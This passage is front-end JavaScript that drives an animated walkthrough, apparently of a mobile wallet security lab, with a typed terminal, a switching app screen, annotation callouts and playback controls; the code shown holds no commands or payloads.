  shards.forEach(function(sh){ var u=sh.userData,k=1+Math.sin(t*0.5+u.ph)*0.06;
    sh.position.set(u.base.x*k+3,u.base.y*k,u.base.z*k);
    sh.rotation.x+=u.spin.x*dt; sh.rotation.y+=u.spin.y*dt; });
  pts.rotation.y-=0.00004*dt;
  renderer.render(scene3,cam3);
}

/* =========================================================
   ENGINE
   ========================================================= */
var term=document.getElementById('term'), arrows=document.getElementById('arrows');
var appScreen=document.getElementById('appScreen'), devices=document.getElementById('devices');
var pTerm=document.getElementById('pTerm'), pApp=document.getElementById('pApp');
var bar=document.getElementById('bar'), count=document.getElementById('count');
var stepLabel=document.getElementById('stepLabel'), stepTitle=document.getElementById('stepTitle'), stepSub=document.getElementById('stepSub');
var dots=document.getElementById('dots'), outro=document.getElementById('outro');

CH.forEach(function(){ var d=document.createElement('div'); d.className='dot'; dots.appendChild(d); });
var dotEls=Array.prototype.slice.call(dots.children);

function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmt(s){ return esc(s).replace(/\{([a-z]+)\|([^}]*)\}/g,function(_,cl,txt){ return '<span class="'+cl+'">'+txt+'</span>'; }); }

var FOCUS={
  wide:{s:1,    ox:50, oy:50},
  duo :{s:1.2,  ox:20, oy:46},
  term:{s:1.72, ox:3,  oy:46},
  app :{s:1.72, ox:39, oy:46}
};
var ch=0, li=0, phase='line', acc=0, paused=false, speed=1, lastT=0, done=false;
var curEl=null, activeNotes=[], autoFocus=true, curApp='home';

function setApp(k){
  if(!APP[k] || curApp===k) return;
  curApp=k; appScreen.innerHTML=APP[k];
  appScreen.classList.remove('flash'); void appScreen.offsetWidth; appScreen.classList.add('flash');
}
function applyFocus(){
  var f=FOCUS[autoFocus?(CH[ch].focus||'wide'):'wide'];
  devices.style.transformOrigin=f.ox+'% '+f.oy+'%';
  devices.style.transform='scale('+f.s+')';
  var mode=autoFocus?(CH[ch].focus||'wide'):'wide';
  pApp.classList.toggle('dim', mode==='term');
  pTerm.classList.toggle('dim', mode==='app');
}
function clearNotes(){ activeNotes.forEach(function(n){ n.el.remove(); n.path.remove(); }); activeNotes=[]; }

function startChapter(n){
  ch=n; li=0; phase='line'; acc=0; curEl=null;
  term.innerHTML=''; clearNotes(); outro.classList.remove('on');
  var c=CH[n];
  stepLabel.textContent='step '+String(n+1).padStart(2,'0')+' / '+String(CH.length).padStart(2,'0');
  stepTitle.textContent=c.step; stepSub.textContent=c.sub;
  dotEls.forEach(function(d,i){ d.className='dot'+(i<n?' done':i===n?' now':''); });
  count.textContent=(n+1)+' / '+CH.length;
  if(c.app) setApp(c.app);
  applyFocus(); beginLine();
}
function beginLine(){
  var c=CH[ch];
  if(li>=c.lines.length){ phase='hold'; acc=0; return; }
  var L=c.lines[li];
  curEl=document.createElement('p'); curEl.className='ln';
  if(L.bar){ curEl.classList.add('bar'); curEl.style.setProperty('--bc',L.bar); }
  if(L.t==='cmd'){
    curEl.classList.add('cmdline');
    curEl.innerHTML='<span class="pr1">mitsec</span><span class="pr2">@com.lab.wallet</span><span class="w">:</span> <span class="typed"></span><span class="caret"></span>';
  }else{
    curEl.innerHTML=fmt(L.s);
  }
  term.appendChild(curEl); term.scrollTop=term.scrollHeight; acc=0;
}
function commitLine(){
  var L=CH[ch].lines[li];
  if(L && L.app) setApp(L.app);
  (CH[ch].notes||[]).forEach(function(n){ if(n.after===li) showNote(n); });
  li++; beginLine();
}
function showNote(n){
  var el=document.createElement('div');
  el.className='note k-'+n.k;
  el.style.left=n.x+'cqw'; el.style.top=n.y+'cqh'; el.style.width=n.w+'cqw';
  el.innerHTML='<h4>'+esc(n.h)+'</h4><p>'+esc(n.p)+'</p>';
  stage.appendChild(el);
  requestAnimationFrame(function(){ el.classList.add('on'); });
  var col={c:'#22D3EE',m:'#34D399',a:'#FBBF24',r:'#F43F5E',v:'#34D399'}[n.k];
  var path=document.createElementNS('http://www.w3.org/2000/svg','path');
  path.setAttribute('stroke',col); path.setAttribute('marker-end','url(#ah)'); path.style.color=col;
  arrows.appendChild(path);
  activeNotes.push({el:el,path:path,target:curEl||term,born:performance.now()});
}
function updateArrows(now){
  if(!activeNotes.length) return;
  var sr=stage.getBoundingClientRect(), sx=1280/sr.width, sy=720/sr.height;
  activeNotes.forEach(function(n){
    var a=n.el.getBoundingClientRect(), b=n.target.getBoundingClientRect();
    var x1=(a.left-sr.left)*sx, y1=(a.top-sr.top+a.height/2)*sy;
    var x2=(b.right-sr.left)*sx+6, y2=(b.top-sr.top+b.height/2)*sy;
    if(x2<-40||x2>1320||y2<-40||y2>760){ n.path.setAttribute('d',''); return; }
    var mx=(x1+x2)/2, my=Math.min(y1,y2)-24;
    n.path.setAttribute('d','M '+x1.toFixed(1)+' '+y1.toFixed(1)+' Q '+mx.toFixed(1)+' '+my.toFixed(1)+' '+x2.toFixed(1)+' '+y2.toFixed(1));
    var len=n.path.getTotalLength(), p=Math.min(1,(now-n.born)/520);
    n.path.setAttribute('stroke-dasharray',len);
    n.path.setAttribute('stroke-dashoffset',(len*(1-p)).toFixed(1));
  });
}
function tick(now){
  var dt=lastT?Math.min(now-lastT,60):16; lastT=now;
  var t=now/1000;
  if(!paused && !done){
    var s=dt*speed, c=CH[ch];
    if(phase==='line'){
      var L=c.lines[li];
      if(L.t==='cmd'){
        acc+=s;
        var shown=Math.floor(acc/30), span=curEl.querySelector('.typed');
        if(shown>=L.s.length){
          span.textContent=L.s;
          var cr=curEl.querySelector('.caret'); if(cr) cr.remove();
          phase='pause'; acc=0;
        }else{ span.textContent=L.s.slice(0,shown); }
      }else{
        acc+=s;
        var dur=L.fast?50:(L.s.length?175+L.s.length*5:300);
        if(acc>=dur) commitLine();
      }
    }else if(phase==='pause'){
      acc+=s; if(acc>=470){ commitLine(); phase='line'; }
    }else if(phase==='hold'){
      acc+=s;
      if(acc>=(c.hold||3000)){
        if(ch+1<CH.length) startChapter(ch+1);
        else { done=true; outro.classList.add('on'); clearNotes(); }
      }
    }
    var prog=phase==='hold'?1:(li/CH[ch].lines.length);
    bar.style.width=(((ch+prog)/CH.length)*100).toFixed(1)+'%';
    term.scrollTop=term.scrollHeight;
  }
  updateArrows(now); renderGL(t,dt);
  requestAnimationFrame(tick);
}

var playBtn=document.getElementById('play');
playBtn.addEventListener('click',function(){ paused=!paused; playBtn.textContent=paused?'Play':'Pause'; });
document.getElementById('next').addEventListener('click',function(){ done=false; startChapter(Math.min(CH.length-1,ch+1)); });
document.getElementById('prev').addEventListener('click',function(){ done=false; startChapter(Math.max(0,ch-1)); });
document.getElementById('restart').addEventListener('click',function(){ done=false; paused=false; playBtn.textContent='Pause'; startChapter(0); });
var spBtn=document.getElementById('speed');
spBtn.addEventListener('click',function(){ speed=speed===1?1.5:speed===1.5?2.5:1; spBtn.textContent=speed+'×'; });
var zmBtn=document.getElementById('zoomBtn');
zmBtn.addEventListener('click',function(){ autoFocus=!autoFocus; zmBtn.textContent=autoFocus?'Auto':'Wide'; applyFocus(); });
document.addEventListener('keydown',function(e){
  if(e.key===' '){ e.preventDefault(); playBtn.click(); }
  if(e.key==='ArrowRight'){ done=false; startChapter(Math.min(CH.length-1,ch+1)); }
  if(e.key==='ArrowLeft'){ done=false; startChapter(Math.max(0,ch-1)); }
  if(e.key.toLowerCase()==='z'){ zmBtn.click(); }
});

try{ initGL(); }catch(err){ canvas.style.display='none'; }
setApp('home');
startChapter(0);
requestAnimationFrame(tick);
